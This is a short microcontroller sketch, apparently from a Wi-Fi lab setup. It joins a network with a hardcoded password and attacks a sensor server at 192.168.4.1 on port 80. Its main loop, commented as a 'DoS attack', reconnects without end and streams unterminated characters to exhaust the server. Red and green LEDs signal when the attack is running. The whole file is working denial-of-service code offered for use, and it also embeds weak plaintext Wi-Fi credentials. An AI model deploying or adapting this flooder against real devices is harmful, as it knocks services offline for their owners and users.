#include <WiFi.h>	// Include WiFi library

#define FAN_PIN 2    // Pin connected to transistor controlling the fan

#define RED_PIN A0  
#define GREEN_PIN A1
#define BLUE_PIN A2


char ssid[] = "WiFi-Access-Point";        // Network SSID
char pass[] = "123456789";                // Network password

char serverSensor[] = "192.168.4.1";    	// Server IP address

WiFiClient client;	// Define WiFi client

void setup() {
    pinMode(RED_PIN, OUTPUT);     
    pinMode(GREEN_PIN, OUTPUT);   
    pinMode(BLUE_PIN, OUTPUT);   
    digitalWrite(RED_PIN, LOW);       
    digitalWrite(GREEN_PIN, HIGH);   
    digitalWrite(BLUE_PIN, LOW);

    IPAddress local_ip(192, 168, 4, 3);
    IPAddress gateway(192, 168, 4, 1);
    IPAddress subnet(255, 255, 255, 0);
    WiFi.config(local_ip, gateway, subnet);	// Configure client IP address
    
    WiFi.begin(ssid, pass);
    while (WiFi.status() != WL_CONNECTED) {
        delay(1000);
    }
}

void loop() {
    if (client.connect(serverSensor, 80)) {   // If connected to port 80
        digitalWrite(GREEN_PIN, LOW);    
        digitalWrite(RED_PIN, HIGH);  

        while (1){				// Infinite loop for DoS attack
            if (!client.connected()) {          // If connection is closed
                client.connect(serverSensor, 80);	// Reconnect
            }
            client.print("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");	// Send string without return
        }

        digitalWrite(RED_PIN, LOW);        
        digitalWrite(GREEN_PIN, HIGH);  
    }

    delay(2000);                    
}
